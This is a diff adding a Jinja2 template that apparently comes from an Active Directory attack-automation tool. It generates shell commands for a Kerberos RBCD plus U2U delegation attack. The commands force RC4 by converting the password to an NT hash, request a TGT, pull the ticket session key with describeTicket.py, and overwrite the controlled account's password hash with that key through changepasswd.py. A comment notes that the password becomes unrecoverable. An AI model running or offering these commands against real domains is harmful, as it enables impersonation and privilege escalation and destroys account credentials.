@@ -1,0 +1,22 @@
+# RBCD + U2U
+# We need to use the nthash instead of the password to enforce the use of RC4
+# instead of AES otherwise we should receive the error 'KDC has no support
+# for encryption type'
+{% if parent.secret_type == T_SECRET_PASSWORD %}
+{{ set_attr(parent, 'secret', password_to_nthash(parent.secret)) }}
+{{ set_attr(parent, 'secret_type', T_SECRET_NTHASH) }}
+{%- endif %}
+{% if parent.secret_type != T_SECRET_NTHASH %}
+Error: can't generate the nthash with aes
+{%- else %}
+{% include '_TGTRequest.jinja2' %}
+
+# Extract the ticket session key and check that the ticket is forwardable
+session_key=`describeTicket.py '{{parent.obj.name}}.ccache' | grep 'Ticket Session Key' | awk -F': ' {{"'{{print $2}}'"}}`
+echo $session_key
+describeTicket.py '{{parent.obj.name}}.ccache' | grep Flags
+
+# Change the password of {{parent.obj.name}} with a hash
+# WARNING: THE PASSWORD WILL BE UNRECOVERABLE
+changepasswd.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -hashes :{{parent.secret|red}} -dc-ip {{dc_ip}} -protocol smb-samr -newhash $session_key
+{%- endif %}
